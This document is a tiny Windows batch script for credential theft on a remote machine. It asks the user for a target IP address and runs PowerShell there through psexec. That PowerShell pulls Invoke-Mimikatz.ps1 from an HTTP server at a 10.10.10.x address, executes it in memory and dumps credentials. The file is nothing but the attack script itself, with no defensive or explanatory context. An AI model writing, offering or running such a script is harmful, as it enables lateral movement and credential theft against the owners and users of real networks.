@echo off

set /p var=Target IP addr:
echo %var%
psexec \\%var% cmd.exe /c powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.xxx/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

pause
